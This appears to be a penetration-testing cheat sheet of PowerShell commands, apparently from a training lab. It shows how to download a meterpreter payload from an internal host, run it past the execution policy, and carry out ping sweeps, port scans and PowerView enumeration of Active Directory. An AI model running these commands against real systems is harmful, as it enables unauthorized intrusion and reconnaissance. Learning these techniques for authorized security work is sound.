# Powershell for Pentesters

## Manipulating Files

```powershell
# Start the notepad app
Start-Process notepad.exe

Get-Process -name notepad

# Export the process information to the csv format
Get-Process | Export-Csv running_process.csv

# Copy-Item , Move-Item
Copy-Item .\IP.txt copy_IP.txt

# Get file Hash
Get-FileHash -Algorithm SHA256 .\IP.txt
```

## Downloading Files

```powershell
# First Way
(New-Object System.Net.WebClient).Downloadfile('http://10.0.2.8:8888/meterpreter-64.ps1', 'meterpreter.ps1')

# Second Way
Invoke-WebRequest 'http://10.0.2.8:8888/meterpreter-64.ps1' -OutFile "meterpreter.ps1"
```

To get Execution policy we can run `Get-ExecutionPolicy -list`.

Execution policies can have seven different values;

- AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.

- Bypass: All scripts can run, and no warnings or prompts will be displayed.

- Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows servers.

- RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.

- Restricted: The default configuration for Windows clients. Allows individual commands to run, does not allow scripts.

- Undefined: This shows that no specific execution policy was set. This means default execution policies will be enforced.

- Unrestricted: Most scripts will run.

To by pass the ExecutionPolicy we can run
```powershell
# First way
powershell -ExectionPolicy Bypass -File .\meterpreter.ps1

# Second way: -scope make only be able run for current powershell session
Set-ExecutionPolicy Bypass -scope Process
```

## System Reconnaissance

`Get-HotFix` enumerate already installed patches. 

```powershell
# This will Grep for all that have InstallOn.
Get-HotFix | Format-list | findstr InstalledOn

Get-HotFix | Format-Table HotFixID
```

`Format-List` can be used to gather more information about objects.


The `Out-File` can be used to save the output to a file for further use.

```powershell
Get-HotFix | Out-File hotfix.txt
```

What Windows Security Update was installed on 5/15/2019?
Get-HotFix | Format-Table | findstr 5/15/2019

## Network Reconnaissance 

Following command can be used for ping a given IP range and grep for lines that include the "TTL" string. 

```powershell
1..15 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}
```

This command check For all 1024 ports to see if is open or not.

```powershell
1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "open port on - $_"} 2>$null
```

## Using PowerView


Gather information about domain with the help of [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).
To import `Import-Module .\powerview.ps1`.

`Get-NetDomainController` command will collect information on the domain controller. Knowing the IP address of the domain controller will be useful to
conduct man-in-the-middle attacks and to focus our efforts on high-value targets. 

`Get-NetUser` will list of domain users. 
```powershell 
Get-NetUser | out-gridview
```



 One of the accounts has a special description; what is it?
 ```powershell
 Get-NetUser -Properties description
 ```

 How many accounts are disabled?
 ```powershell
 Get-NetUser -Properties useraccountcontrol | findstr ACCOUNTDISABLE | measure
 ```

 How many users are in the “domain admins” group?
 ```powershell
 Get-NetGroupMember “Domain Admins” | measure
 ````
